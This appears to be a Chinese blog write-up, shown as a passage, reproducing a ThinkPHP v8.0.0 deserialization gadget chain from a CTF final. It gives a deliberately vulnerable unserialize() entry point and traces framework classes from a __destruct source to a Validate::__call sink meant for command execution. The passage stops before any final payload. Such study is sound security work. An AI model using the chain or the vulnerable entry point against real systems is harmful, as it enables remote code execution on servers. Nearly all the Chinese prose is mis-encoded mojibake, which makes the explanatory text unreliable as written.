<p>åŒæ—¶åœ¨è¿™é‡ŒçŸ¥é“ï¼Œå¯¹äºä¸€äº›æ¡†æ¶ï¼Œæœ‰äº›æ¼æ´ç‚¹çœŸå¯ä»¥å»github issueä¸Šçœ‹ï¼Œæˆ‘çœ‹è¿™æ¡é“¾å­çš„POCå°±æ˜¯åœ¨github issueä¸Šå¯ä»¥çœ‹åˆ°çš„ï¼Œå¯ä»¥çœ‹å‚è€ƒæ–‡ç« ã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a class="link" href="https://github.com/top-think/framework/issues/2749"  target="_blank" rel="noopener"
    >https://github.com/top-think/framework/issues/2749</a></p>
<p><a class="link" href="https://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD&amp;u_atoken=d85375bd9b5b083adb46a87b18f126c7&amp;u_asig=1a0c399a17410911216675510e012d"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD&u_atoken=d85375bd9b5b083adb46a87b18f126c7&u_asig=1a0c399a17410911216675510e012d</a></p>
<p><a class="link" href="https://blog.csdn.net/qq_29920751/article/details/87630803"  target="_blank" rel="noopener"
    >https://blog.csdn.net/qq_29920751/article/details/87630803</a></p>
<p><a class="link" href="https://blog.csdn.net/qq_21296205/article/details/128369757"  target="_blank" rel="noopener"
    >https://blog.csdn.net/qq_21296205/article/details/128369757</a></p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<h3 id="thinkphpv800-ååºåˆ—åŒ–æ¼æ´">Thinkphpv8.0.0 ååºåˆ—åŒ–æ¼æ´
</h3><p>éœ€è¦ä½¿ç”¨php8ï¼Œæˆ‘è¿™é‡Œæ˜¯php8.2.9+thinkphp v8.0.0</p>
<p>è¿™ä¸ªæ˜¯niviaå­¦é•¿åœ¨2024xctf finalå‡ºçš„é¢˜ï¼Œå½“æ—¶ä»–æ˜¯æŒ–å‡ºæ¥çš„0dayï¼Œè¿™é‡Œä¹Ÿæ˜¯æ¥å¤ç°ä¸€ä¸‹ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<h4 id="ç¯å¢ƒæ­å»º-2">ç¯å¢ƒæ­å»º
</h4><p>ç¯å¢ƒæ­å»ºä¸€ä¸ªphp8çš„ç¯å¢ƒï¼Œå‚è€ƒä¹‹å‰å‘çš„æ­å»ºçš„php7çš„è°ƒè¯•ç¯å¢ƒæ•™ç¨‹ï¼Œå·®ä¸å¤šçš„ã€‚</p>
<p>ç„¶åä¸‹è½½æºç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">composer create-project topthink/think=8.0.0 think-8.0.0
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ”¹composer.jsonæ–‡ä»¶çš„æ¡†æ¶ç‰ˆæœ¬ä¸ºæŒ‡å®šç‰ˆæœ¬<code>8.0.0</code>ï¼Œç„¶åè¿è¡Œ<code>composer update</code>æ›´æ–°ä¸€ä¸‹å³å¯ã€‚</p>
<p>æœ€åè®¿é—®æˆåŠŸæ­å»ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061538764.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306153801695"
	
	
></p>
<p>è¿™é‡Œè¿˜æ˜¯åœ¨app/controller/Indexé¡µé¢åŠ ä¸€ä¸ªå…¥å£å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">app\BaseController</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Index</span> <span class="k">extends</span> <span class="nx">BaseController</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;style&gt;*{ padding: 0; margin: 0; }&lt;/style&gt;&lt;iframe src=&#34;https://www.thinkphp.cn/welcome?version=&#39;</span> <span class="o">.</span> <span class="nx">\think\facade\App</span><span class="o">::</span><span class="na">version</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&#34; width=&#34;100%&#34; height=&#34;100%&#34; frameborder=&#34;0&#34; scrolling=&#34;auto&#34;&gt;&lt;/iframe&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hello</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;ThinkPHP8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;hello,&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ä»£ç å®¡è®¡äº†ã€‚</p>
<p>psï¼šå¥½åƒè¿™æ¡é“¾å­ååŠéƒ¨åˆ†å’Œä¸€ä¸ªthinkphp6çš„å¾ˆåƒï¼Œå’Œæˆ‘å‰é¢å®¡çš„ä¸ä¸€æ ·ï¼Œç›´æ¥ä»è¿™é‡Œå­¦äº†ï¼Œä¸å†è¿”å›å»å®¡è®¡é‚£ä¸ªäº†ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<h4 id="ä»£ç å®¡è®¡-1">ä»£ç å®¡è®¡
</h4><p>åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œä»£ç å®¡è®¡è¦é€‰å¥½sinkç‚¹å’Œsourceç‚¹ï¼Œç„¶ååœ¨æŒ–é“¾å­çš„è¿‡ç¨‹ä¸­å»é å³å¯ï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<h5 id="sourceç‚¹é€‰æ‹©">sourceç‚¹é€‰æ‹©
</h5><p>ä¸€èˆ¬çš„sourceç‚¹å°±æ˜¯<code>__destruct</code>æˆ–è€…<code>__wakeup</code>æ–¹æ³•ï¼Œç›´æ¥å…¨å±€æœç´¢<code>__destruct</code>æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå¯ä»¥ä½¿ç”¨çš„ç‚¹ï¼š</p>
<p>League\Flysystem\Cached\Storage\AbstractCacheï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>think\route\ResourceRegisterï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è¿™é‡Œé€‰æ‹©çš„æ˜¯ç¬¬äºŒä¸ªã€‚</p>
<h5 id="sinkç‚¹é€‰æ‹©">sinkç‚¹é€‰æ‹©
</h5><p><strong>ä¸€èˆ¬æ¡†æ¶çš„ååºåˆ—åŒ–sinkç‚¹éƒ½ä¼šé€‰æ‹©callæ–¹æ³•ï¼Œå› ä¸ºä¸€èˆ¬å¯èƒ½çš„å±é™©æ“ä½œéƒ½åœ¨callæ–¹æ³•ä¸Š</strong>ã€‚</p>
<p>åœ¨è¿™é‡Œä½¿ç”¨çš„æ˜¯think\Validate#__callï¼Œä»£ç é€»è¾‘å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;is&#39;</span> <span class="o">==</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$method</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">array_push</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="nx">lcfirst</span><span class="p">(</span><span class="nv">$method</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;is&#39;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªä»£ç é€»è¾‘ï¼Œå¦‚æœæƒ³è¦èƒ½å¤Ÿè¿›å…¥ifè¯­å¥ï¼Œéœ€è¦<code>$method</code>åä¸ºç±»ä¼¼isevalè¿™ç§ï¼Œç„¶åå°±ä¼šæˆªå–ï¼Œå°†<code>$method</code>çš„å€¼æ›´æ–°ä¸ºevalè¿™ç§ï¼Œæœ€åå°±è°ƒç”¨äº†call_user_func_array()æ–¹æ³•ï¼Œè¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä¹Ÿæ˜¯éå¸¸æœ‰æ„æ€ï¼Œç»™ä¸€ä¸ªä»£ç è¯´è¯´è¿™é‡Œçš„é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Foo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">bar</span><span class="p">(</span><span class="nv">$arg</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="no">__METHOD__</span><span class="p">,</span> <span class="s2">&#34; got </span><span class="si">$arg</span><span class="s2"> and </span><span class="si">$arg2\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$foo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$foo</span><span class="p">,</span> <span class="s2">&#34;bar&#34;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;three&#34;</span><span class="p">,</span> <span class="s2">&#34;four&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="c1">//output:  Foo::bar got three and four
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå°±æ˜¯è°ƒç”¨<code>$foo</code>å®ä¾‹çš„bar()å‡½æ•°ï¼Œé‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨åŸæ¥çš„payloadä¸Šï¼Œè¿™é‡Œå°±æ˜¯è°ƒç”¨<code>$this</code>çš„is()å‡½æ•°ï¼Œå…¨å±€æœç´¢iså‡½æ•°ï¼Œå¾—åˆ°äº†å¦‚ä¸‹å‡½æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061633633.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306163321534"
	
	
></p>
<p>åŒæ ·è¿˜æ˜¯think/Validateç±»çš„is()å‡½æ•°ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ€åè¿™é‡Œçš„å‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œå¯ä»¥è¾¾åˆ°è°ƒç”¨å›è°ƒå‡½æ•°æ¥è¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„æ•ˆæœã€‚</p>
<p>ç°åœ¨sinkç‚¹å’Œsourceç‚¹éƒ½æ‰¾åˆ°äº†ï¼Œæ¥çœ‹ä¸€ä¸‹ä¸­é—´çš„é“¾å­ã€‚</p>
<h5 id="é“¾å­å¯»æ‰¾">é“¾å­å¯»æ‰¾
</h5><p>å…¥å£ç‚¹æ˜¯ think\route\ResourceRegisterç±»çš„<code>__destruct</code>å‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$this-&gt;registered</code>å˜é‡å¯æ§ï¼Œç„¶åå›è°ƒç”¨åˆ°register()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">register</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">-&gt;</span><span class="na">parseGroupRule</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">-&gt;</span><span class="na">getRule</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®è¿™é‡Œå°±èƒ½å°è¯•è°ƒç”¨<code>__call()</code>æ–¹æ³•ï¼Œä½†æ˜¯åœ¨å‰é¢æƒ³è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œæ˜¯éœ€è¦åœ¨è°ƒç”¨<code>__call()</code>æ–¹æ³•æ—¶æ˜¯éœ€è¦æœ‰å‚æ•°çš„ï¼Œä½†æ˜¯è¿™é‡Œçš„<code>getRule()</code>æ–¹æ³•æ˜¯æ— æ³•è¿›è¡Œä¼ å‚çš„ã€‚</p>
<p>è¿˜æ˜¯ç›´æ¥è·Ÿè¿›ï¼Œè°ƒç”¨çš„getRule()æ–¹æ³•ä¼šè°ƒç”¨åˆ°Resource.phpæ–‡ä»¶çš„çˆ¶ç±»çš„çˆ¶ç±»Ruleç±»çš„getRule()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getRule</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥è¿™é‡Œçš„å‚æ•°æ˜¯å¯æ§çš„ã€‚</p>
<p>ç„¶åçœ‹ä¸€ä¸‹parseGroupRule()æ–¹æ³•ï¼Œä¼šè°ƒç”¨åˆ°Resource.phpæ–‡ä»¶çš„parseGroupRule()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061655846.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306165556758"
	
	
></p>
<p>å¦‚ä¸Šå›¾ï¼Œé€šè¿‡å‚æ•°çš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥çš„æ‰§è¡Œï¼Œç›´æ¥æ‰§è¡Œåé¢çš„ä»£ç ï¼Œç„¶åçœ‹ç¬¬äºŒä¸ªæ¡†å‡ºæ¥çš„éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹è§å¾ˆæ˜æ˜¾çš„æ‹¼æ¥æ“ä½œï¼Œè¿™é‡Œæ˜¯å¯ä»¥å°è¯•è°ƒç”¨toStringé“¾çš„ï¼Œè¿™é‡Œå†ç®€å•çœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼Œçœ‹æ˜¯å¦å¯ä»¥æ§åˆ¶ï¼Œå®¡è®¡äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå…·ä½“å°±çœ‹åé¢çš„POCå§ï¼Œç»§ç»­æ‰¾é“¾å­ã€‚ã€‚</p>
<p>ç°åœ¨å°±æ˜¯éœ€è¦å»æ‰¾è°ƒç”¨toString()é“¾å­ï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯think\model\concern\Conversionç±»çš„<code>__toString()</code>é“¾ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061713534.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171339466"
	
	
></p>
<p>è·Ÿè¿›è¿™ä¸ªtoJson()ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061714193.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171400136"
	
	
></p>
<p>ç„¶åè°ƒç”¨toArray()ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">toArray</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$hasVisible</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">str_contains</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="nv">$relation</span><span class="p">,</span> <span class="nv">$name</span><span class="p">]</span>    <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$visible</span><span class="p">[</span><span class="nv">$relation</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$visible</span><span class="p">[</span><span class="nv">$val</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hasVisible</span>    <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$visible</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">str_contains</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="nv">$relation</span><span class="p">,</span> <span class="nv">$name</span><span class="p">]</span>   <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$relation</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$val</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰
